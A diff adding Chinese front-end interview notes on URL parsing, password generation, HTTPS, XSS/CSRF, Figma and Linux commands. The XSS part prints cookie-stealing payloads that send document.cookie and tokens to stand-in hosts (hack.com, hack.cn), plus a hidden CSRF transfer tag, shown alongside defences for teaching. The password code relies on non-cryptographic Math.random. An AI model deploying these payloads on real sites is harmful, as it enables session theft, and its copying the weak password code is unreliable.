@@ -664,3 +664,341 @@ export default function TodoApp() {
   );
 }
 ```
+
+## 手写提取url
+
+?name=john&age=30
+&hobbies=run&hobbies=dance
+&location[city]=new20%work
+
+返回name,age,hobbies,city
+
+{
+  "name": "john",
+  "age": "30",
+  "hobbies": ["run", "dance"],
+  "city": "new work"
+}
+
+### URL 查询参数解析题
+
+- 同名参数（hobbies=run&hobbies=dance）要解析成数组
+  遍历参数键值对，判断键是否已存在，不存在则存单个值，存在则将原值转为数组并追加新值，最终同名参数自动成数组
+  ```
+  const result = {};
+  // 遍历每一组参数 key=value
+  for (const [key, value] of params) {
+    if (result[key] === undefined) {
+      // 第一次存单个值
+      result[key] = value;
+    } else {
+      // 已存在 → 转数组并追加
+      // [] 空数组 concat  
+      result[key] = [].concat(result[key], value);
+    }
+  }
+  ```
+- URL 编码（%20）要转成空格
+  URL 规范中空格是非法字符，无法直接传输，所以要用%20这种 URL 编码格式替代，才能保证数据在网络中正确传递。
+  decodeURIComponent 
+- 嵌套参数（location[city]）要提取为city字段
+  提取出 city 作为最终字段名，忽略外层的 location。
+  ```js
+  function parseKey(key) {
+    const match = key.match(/\[([^\]]+)\]$/);
+    return match ? match[1] : key;
+  }
+  const key = "location[city]";
+  const finalKey = parseKey(key); 
+  ```
+
+- 代码
+
+```js
+/**
+ * 解析URL查询字符串，转换成指定格式的JSON对象
+ * @param {string} queryStr - URL参数字符串
+ * @returns {object} 解析后的对象
+ */
+function parseUrlQuery(queryStr) {
+  // 1. 初始化结果对象
+  const result = {};
+
+  // 2. 使用URLSearchParams解析参数（自动处理&分隔）
+  // 自动拆分键值对
+  const params = new URLSearchParams(queryStr);
+
+  // 3. 遍历所有参数键值对
+  for (const [key, value] of params) {
+    // ====================== 处理1：URL解码（%20 → 空格）======================
+    const decodedValue = decodeURIComponent(value);
+
+    // ====================== 处理2：提取嵌套key（location[city] → city）======================
+    const matched = key.match(/^.+\[(.+)\]$/); // 正则匹配 [xxx]
+    const finalKey = matched ? matched[1] : key;
+
+    // ====================== 处理3：同名参数转数组（hobbies=run&hobbies=dance）======================
+    if (result[finalKey] === undefined) {
+      // 第一次出现，直接赋值
+      result[finalKey] = decodedValue;
+    } else {
+      // 已存在，转为数组并追加
+      result[finalKey] = [].concat(result[finalKey], decodedValue);
+    }
+  }
+
+  // 4. 返回最终结果
+  return result;
+}
+
+// ========== 测试调用 ==========
+const urlParams = `?name=john&age=30&hobbies=run&hobbies=dance&location[city]=new%20work`;
+const res = parseUrlQuery(urlParams);
+console.log(res);
+```
+
+## 手写随机密码生成函数
+
+请用 JavaScript 实现一个函数 generatePassword()，生成一个 8 位随机密码。
+
+要求：
+1. 密码长度固定 8 位；
+2. 字符集包含：大小写字母（a-z、A-Z）+ 数字（0-9）；
+3. 字符随机分布，不可预测；
+4. 无需考虑密码强度（如必须含大写 / 数字），纯随机即可；
+5. 直接返回字符串，无需其他参数。
+
+输出类似："7sKp9xQ2"、"aZ8bL3mP" 等 8 位混合字符串
+
+```js
+function generatePassword() {
+  // 1. 定义字符集：大小写字母 + 数字
+  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let password = '';
+  // 2. 循环 8 次，每次随机取一个字符
+  for (let i = 0; i < 8; i++) {
+    const randomIndex = Math.floor(Math.random() * chars.length);
+    password += chars[randomIndex];
+  }
+  // 3. 返回结果
+  return password;
+}
+```
+
+### 强密码版（必须含大小写 + 数字）
+
+- 必须至少包含 1 个大写字母、1 个小写字母、1 个数字；
+- 其余字符随机。
+
+```
+/**
+ * 生成8位强密码
+ * 强制包含：小写字母、大写字母、数字
+ * 其余字符从混合字符集随机选取
+ */
+function generateStrongPwd() {
+  // 1. 拆分三类必选字符集
+  const lower = 'abcdefghijklmnopqrstuvwxyz'; // 小写
+  const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; // 大写
+  const number = '0123456789';                // 数字
+  // 混合总字符集
+  const all = lower + upper + number;
+
+  // 2. 先各自必取一位，保证密码强度
+  let pwd = '';
+  // 随机取1位小写
+  pwd += lower[Math.floor(Math.random() * lower.length)];
+  // 随机取1位大写
+  pwd += upper[Math.floor(Math.random() * upper.length)];
+  // 随机取1位数字
+  pwd += number[Math.floor(Math.random() * number.length)];
+
+  // 3. 还差 5位，从全部字符随机补全
+  for (let i = 0; i < 5; i++) {
+    const idx = Math.floor(Math.random() * all.length);
+    pwd += all[idx];
+  }
+
+  // 4. 打乱顺序（避免前三位固定：小、大、数）
+  // 字符串转数组打乱再拼接
+  return pwd.split('').sort(() => 0.5 - Math.random()).join('');
+}
+
+// 测试
+console.log(generateStrongPwd());
+```
+
+## 为什么https 比http 更安全
+
+### https
+
+HTTPS = HTTP (应用层) + SSL/TLS (表示层) + TCP (传输层 底层)
+
+┌─────────────────────────────┐
+│ 7 应用层   Application      │  ← HTTP、HTTPS、FTP、DNS
+├─────────────────────────────┤
+│ 6 表示层   Presentation     │  ← SSL / TLS 加密解密（HTTPS核心）
+├─────────────────────────────┤
+│ 5 会话层   Session          │
+├─────────────────────────────┤
+│ 4 传输层   Transport        │  ← TCP 可靠传输
+├─────────────────────────────┤
+│ 3 网络层   Network          │  ← IP
+├─────────────────────────────┤
+│ 2 数据链路层 Data Link     │  ← MAC、交换机
+├─────────────────────────────┤
+│ 1 物理层   Physical        │  ← 网线、信号
+└─────────────────────────────┘
+
+HTTP/https 跑在第七层应用层，
+SSL/TLS 加密在第六层表示层，
+下层依托 四层 TCP、三层 IP。
+
+SSL：Secure Sockets Layer，安全套接层 
+TLS：Transport Layer Security，传输层安全协议
+
+TLS 是 SSL 的升级版，现在 HTTPS 实际用的都是 TLS。
+
+表示层负责数据加解密（对称加密）、格式转换（前端发UTF-8，老服务器只认GBK，表示层自动转码，避免乱码， Content-Type: text/html; charset=utf-8）、编码处理、压缩解压（Accept-Encoding: gzip, deflate, br）、序列化（form 标签原生提交 不会自动序列化，要手动 stringify ），统一数据格式与安全规则，让两端正常解析通信。
+
+
+可以把 HTTPS 想成你用信鸽给服务器寄一封绝密信：一开始你先打个招呼，说“我支持这些加密方式”，服务器回你一封信，顺便把自己的“公钥”（锁）和证书（权威机构颁发）一起给你，你先验证这个证书是真的（防止对面是冒充的），确认没问题后，你自己生成一个随机的“会话密码”（后面真正用来加密数据的对称密钥），但这个密码不能直接明文发，于是你用服务器给你的公钥把它加密，再通过信鸽发过去，只有服务器手里的私钥能解开；服务器解开后，你们双方就拿到了同一个“会话密码”，接下来所有通信就都用这个对称密钥来加密和解密，因为它速度快、效率高，所以整个过程其实就是：先用非对称加密安全地把“密码”传过去，再用对称加密高效地传输真正的数据。
+
+## 你知道什么是XSS 怎么做到的？
+
+XSS：Cross-Site Scripting，跨站脚本攻击
+
+攻击者往网页注入恶意 JS 代码，别人访问页面时自动执行，盗取 Cookie、localStorage, 篡改页面或窃取用户信息。
+
+- 配置正确的 Cookie ，比 localStorage 安全得多。
+
+  - HttpOnly
+  开启 HttpOnly 后，浏览器禁止 JS 读取操作 Cookie，就算遭遇 XSS 攻击，黑客也偷不到 Cookie。
+
+  - SameSite 是 Cookie 跨域请求限制策略，分 Strict（完全禁止跨站携带 Cookie，）、Lax（允许简单跨站 GET 跳转带 Cookie）、None（所有跨站请求都携带 Cookie，），用来拦截非法跨站请求，抵御 CSRF 攻击，保障接口安全。
+    - XSS 本质：恶意 JS 在当前同源页面内部运行，合法同域环境，SameSite 管不了同域脚本；
+    - CSRF 本质：诱导用户从外部跨站偷偷发请求，SameSite 就是用来拦截这类跨站非法请求的。
+      - 你登录了银行官网，浏览器存好了你的 Cookie；
+      - 你没退出登录，又点开黑客垃圾网页；
+      - 黑客页面藏了一行隐形代码，自动向银行接口发转账请求；
+      <img src="https://bank.com/transfer?to=hacker&money=1000" style="display:none">
+      - 浏览器自动带上你的银行 Cookie，网站误以为是你本人操作，直接转账。
+
+  - secure
+    - 标记了 Secure 的 Cookie，只在 HTTPS 加密请求下才会发送；
+    - 普通 HTTP 明文请求，绝对不会携带该 Cookie；
+    - 防止在不安全的明文网络里，被中间人抓取、窃取 Cookie。
+    防明文抓包泄露
+
+### 怎么做到的
+
+1. 存储型 XSS（永久 XSS）
+黑客把恶意 JS 提交到网站数据库（评论、留言、发帖），所有用户访问该页面都会自动执行恶意代码，危害最大。
+  论坛评论区，后端没做特殊字符过滤，直接存入数据库，所有人可见。
+  <script>
+// 盗取当前用户 localStorage、Cookie 并发送给黑客
+fetch('https://hack.com/steal?data='+document.cookie+localStorage.token)
+</script>
+
+  输入过滤 前后端统一过滤特殊字符：< > & " '，拦截恶意标签与脚本特征。
+  输出转义 页面渲染数据时，对用户内容做HTML 转义，把标签变为普通文本，无法执行。
+  CSP 内容安全策略 限制脚本加载来源，禁止执行内联脚本、非法外部脚本，从根源拦截恶意 JS。
+
+
+2. 反射型 XSS（一次性 XSS）
+恶意代码藏在 URL 参数里，诱导用户点击恶意链接，页面瞬时反射执行脚本，只针对当前点击的人生效。
+  网站搜索页，URL 参数直接拼接到页面展示，不过滤、不转义。
+  http://test.com/search?key=手机
+  页面直接显示：你搜索的内容：手机
+  http://test.com/search?key=<script>alert('偷你信息')</script>
+
+  - 黑客把这条链接发给你，诱导你点击；
+  - 服务器拿到 URL 里的 key 参数，直接原样返回渲染到页面；
+  - 浏览器解析页面，恶意 script 立刻执行；
+  - 只在本次打开链接生效，数据不存数据库，关掉页面就没了，所以叫「一次性」。
+
+  http://test.com/search?key=<script>fetch('https://hack.cn/steal?c='+document.cookie)</script>
+
+  参数严格过滤
+  后端校验 URL 参数，过滤 < > " ' & 等特殊脚本字符。
+  输出 HTML 转义
+  页面渲染 URL 传入的变量时，强制转义，让标签变成纯文本，无法执行。
+  禁止直接拼接参数
+  后端 / 前端不要把 URL 参数直接拼入 HTML 页面代码。
+  开启 CSP 策略
+  禁止未知内联脚本执行，拦截恶意代码运行。
+  Cookie 加固
+  配置 HttpOnly，就算被注入脚本，也偷不到登录 Cookie。
+
+3. DOM 型 XSS
+不经过服务器，纯前端 JS 直接操作 DOM，拼接恶意内容渲染页面，本地前端代码漏洞直接触发攻击。 
+
+不经过服务器、不存数据库，纯前端 JS 直接操作 DOM 造成漏洞。
+
+<body>
+  <div id="box"></div>
+
+  <script>
+    // 直接获取URL参数，用 innerHTML 渲染
+    let name = location.search.split('name=')[1];
+    document.getElementById('box').innerHTML = name;
+  </script>
+
+  http://xxx.com?name=<img src=x onerror="alert('偷信息')">
+
+  黑客发恶意链接，用户点开；
+  前端 JS 直接读取 URL 参数；
+  用 innerHTML 把恶意代码写入页面；
+  加载报错触发 onerror，恶意代码执行；
+  全程服务器无感知、无数据存储，只在当前浏览器生效。
+
+
+  DOM 型 XSS 解决办法
+  禁用危险 API：不用 innerHTML、document.write
+  安全渲染：改用 textContent 纯文本展示
+  对 URL 参数做转义过滤
+  开启 CSP 限制内联事件脚本
+
+- 反射型XSS和DOM型XSS的区别是什么？
+
+  反射型过服务器，DOM 型不过服务器。
+
+## 前端相关AI
+### Figma
+Figma 是云端 UI/UX 设计工具，支持多人实时协作、跨平台使用，兼具设计、原型与交付能力。
+
+在传统互联网公司里，日常用 Figma 做界面 / 原型的，主要是 UI/UX 设计师（交互 / 视觉设计师）。
+
+按角色分：
+- UI 设计师：画页面、做视觉、组件库、标注切图（主力）。
+- UX / 交互设计师：画流程、线框图、高保真原型（常用 Figma）。
+- 产品经理：偶尔用 Figma 搭简单原型、标注需求，但不做精细设计。
+- 前端 / 客户端：只看稿、拿标注，不负责设计。
+
+干活的是 UI/UX 设计师，产品经理会用但不负责设计， 前端根据 UI 设计师输出的 Figma 设计稿，还原页面结构、样式、交互，实现高保真视觉效果与功能。
+
+
+## 了解linux 
+
+- 日常命令都能独立使用
+  - 文件操作ls、cd、mkdir、rm、cp、mv
+  - 文件查看编辑cat、vim、less
+    cat 1.txt 2.txt 查看单个或多个文件 
+    cat > test.txt <<EOF
+    第一行内容
+    第二行内容
+    第三行内容
+    EOF
+    Vim 是 高性能模态文本编辑器 不需要鼠标
+      快捷键强大
+      竖向选择 ctrl + v
+  - 权限管理
+    chmod 
+      chmod -R 777 文件名 
+      -R 把这个目录 + 里面所有文件、子文件夹 全部生效 最高权限
+    chown 修改 文件 / 文件夹 的 所属用户 和 所属组
+    chown root test.txt 把 test.txt 归属改成 root 用户
+
+  - 进程端口ps、top、kill、netstat
+  - 网络请求curl、ping
+    
